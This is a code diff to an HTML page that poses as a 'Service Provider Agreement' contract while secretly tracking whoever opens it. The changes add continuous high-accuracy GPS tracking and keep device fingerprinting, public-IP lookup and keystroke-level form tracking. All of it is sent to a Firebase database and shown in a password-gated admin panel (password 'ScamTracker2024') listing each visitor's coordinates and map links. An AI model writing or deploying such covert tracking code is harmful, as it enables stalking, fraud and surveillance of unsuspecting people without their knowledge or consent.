@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Service Agreement Contract</title>
     <style>
-        /* Optimized Contract Styling */
         body {
             font-family: 'Roboto', Arial, sans-serif;
             line-height: 1.6;
@@ -44,8 +43,6 @@
             padding-top: 20px;
             border-top: 1px dashed #ddd;
         }
-        
-        /* Admin Panel Styles */
         #adminOverlay {
             display: none;
             position: fixed;
@@ -124,7 +121,7 @@
     </style>
 </head>
 <body>
-    <!-- Contract Page (Instant Load) -->
+    <!-- Contract Page -->
     <div class="contract-header">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Legal_Document_Icon.svg/1200px-Legal_Document_Icon.svg.png" alt="Legal Document" loading="lazy">
         <div class="contract-title">SERVICE PROVIDER AGREEMENT</div>
@@ -183,9 +180,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script>
-        // ========================
-        // 🔥 FIREBASE CONFIGURATION
-        // ========================
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
             authDomain: "gps-d0bab.firebaseapp.com",
@@ -198,50 +193,46 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // ========================
-        // 🚀 INSTANT TRACKING SYSTEM
-        // ========================
+        // Session Management
         const sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
-        const adminPassword = "ScamTracker2024"; // CHANGE THIS IN PRODUCTION
+        const adminPassword = "ScamTracker2024"; // CHANGE THIS
 
-        // 1. IMMEDIATE LOCATION TRACKING
+        // 1. HIGH-ACCURACY GPS TRACKING
         function trackLocation() {
             if (navigator.geolocation) {
-                // First try: High accuracy (GPS)
-                navigator.geolocation.getCurrentPosition(
+                const options = {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 10000
+                };
+
+                const watchId = navigator.geolocation.watchPosition(
                     position => {
                         const { latitude, longitude, accuracy } = position.coords;
                         db.ref(`sessions/${sessionId}/location`).set({
-                            coords: { lat: latitude, lng: longitude },
-                            accuracy: Math.round(accuracy) + 'm',
-                            mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
+                            coords: {
+                                lat: latitude.toFixed(6),
+                                lng: longitude.toFixed(6)
+                            },
+                            accuracy: Math.round(accuracy) + ' meters',
+                            mapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
                             timestamp: new Date().toISOString(),
                             status: "active"
                         });
                     },
                     error => {
-                        // Fallback to IP geolocation
-                        fetch('https://ipapi.co/json/')
-                            .then(res => res.json())
-                            .then(data => {
-                                db.ref(`sessions/${sessionId}/location`).set({
-                                    coords: { lat: data.latitude, lng: data.longitude },
-                                    accuracy: "5000m (IP estimate)",
-                                    mapsLink: `https://maps.google.com/?q=${data.latitude},${data.longitude}`,
-                                    timestamp: new Date().toISOString(),
-                                    status: "ip_fallback",
-                                    error: error.message
-                                });
-                            });
+                        db.ref(`sessions/${sessionId}/location`).set({
+                            status: "error",
+                            error: error.message,
+                            timestamp: new Date().toISOString()
+                        });
                     },
-                    { 
-                        enableHighAccuracy: true,
-                        maximumAge: 0,
-                        timeout: 5000
-                    }
+                    options
                 );
+
+                // Store watchId for cleanup
+                db.ref(`sessions/${sessionId}/watchId`).set(watchId);
             } else {
-                // Browser doesn't support geolocation
                 db.ref(`sessions/${sessionId}/location`).set({
                     status: "unsupported",
                     timestamp: new Date().toISOString()
@@ -249,23 +240,29 @@
             }
         }
 
-        // 2. INSTANT PAGE LOAD
+        // 2. INITIALIZE PAGE
         document.getElementById('currentDate').textContent = new Date().toLocaleDateString();
         document.getElementById('contractId').textContent = 'CN-' + Math.floor(Math.random() * 9000 + 1000);
 
         // 3. DEVICE FINGERPRINTING
-        function collectDeviceData() {
-            return {
+        db.ref(`sessions/${sessionId}`).update({
+            startTime: new Date().toISOString(),
+            device: {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                languages: navigator.languages,
-                ip: 'pending' // Updated by IP check
-            };
-        }
+                ip: 'pending'
+            }
+        });
 
-        // 4. FORM TRACKING
+        // 4. GET IP ADDRESS
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                db.ref(`sessions/${sessionId}/device`).update({ ip: data.ip });
+            });
+
+        // 5. FORM TRACKING
         function setupFormTracking() {
             document.querySelectorAll('input').forEach(field => {
                 field.addEventListener('input', (e) => {
@@ -289,26 +286,11 @@
             });
         }
 
-        // 5. INITIALIZE TRACKING
-        db.ref(`sessions/${sessionId}`).update({
-            startTime: new Date().toISOString(),
-            device: collectDeviceData()
-        });
-
-        // Get IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                db.ref(`sessions/${sessionId}/device`).update({ ip: data.ip });
-            });
-
-        // Start all tracking
+        // START TRACKING
         trackLocation();
         setupFormTracking();
 
-        // ========================
-        // 🚪 ADMIN PANEL FUNCTIONS
-        // ========================
+        // ADMIN PANEL FUNCTIONS
         function verifyAdmin() {
             const enteredPassword = document.getElementById('adminPassword').value;
             if (enteredPassword === adminPassword) {
@@ -338,14 +320,11 @@
                     const location = sessionData.location || {};
                     const ip = device.ip || 'Unknown';
                     
-                    let locationStatus = "❌ Blocked";
+                    let locationStatus = "❌ Location blocked";
                     let mapsLink = "#";
                     
                     if (location && location.status === "active") {
-                        locationStatus = `✅ ${location.coords.lat}, ${location.coords.lng}`;
-                        mapsLink = location.mapsLink;
-                    } else if (location && location.status === "ip_fallback") {
-                        locationStatus = `🌐 ${location.coords.lat}, ${location.coords.lng} (IP-based)`;
+                        locationStatus = `📍 ${location.coords.lat}, ${location.coords.lng}`;
                         mapsLink = location.mapsLink;
                     } else if (location && location.error) {
                         locationStatus = `⚠️ ${location.error}`;
@@ -356,7 +335,7 @@
                             <h3>🔎 ${sessionId}</h3>
                             <p><strong>📅 Started:</strong> ${new Date(sessionData.startTime).toLocaleString()}</p>
                             <p><strong>🌐 IP:</strong> ${ip}</p>
-                            <p><strong>📍 Location:</strong> ${locationStatus}</p>
+                            <p><strong>${locationStatus}</strong></p>
                             
                             ${mapsLink !== "#" ? `
                                 <p>
@@ -383,6 +362,14 @@
 
         function deleteSession(sessionId) {
             if (confirm(`Delete ALL data for session ${sessionId}?`)) {
+                // Clear geolocation watch if exists
+                db.ref(`sessions/${sessionId}/watchId`).once('value').then(snap => {
+                    const watchId = snap.val();
+                    if (watchId && navigator.geolocation) {
+                        navigator.geolocation.clearWatch(watchId);
+                    }
+                });
+                
                 db.ref(`sessions/${sessionId}`).remove()
                     .then(() => alert("Session deleted successfully"))
                     .catch(() => alert("Failed to delete session"));
@@ -391,6 +378,17 @@
 
         function deleteAllData() {
             if (confirm("⚠️ Delete ALL tracking data? This cannot be undone!")) {
+                // Clear all geolocation watches
+                db.ref('sessions').once('value').then(snapshot => {
+                    const sessions = snapshot.val() || {};
+                    Object.keys(sessions).forEach(sessionId => {
+                        const watchId = sessions[sessionId].watchId;
+                        if (watchId && navigator.geolocation) {
+                            navigator.geolocation.clearWatch(watchId);
+                        }
+                    });
+                });
+                
                 db.ref('sessions').remove()
                     .then(() => {
                         alert("All data deleted successfully");
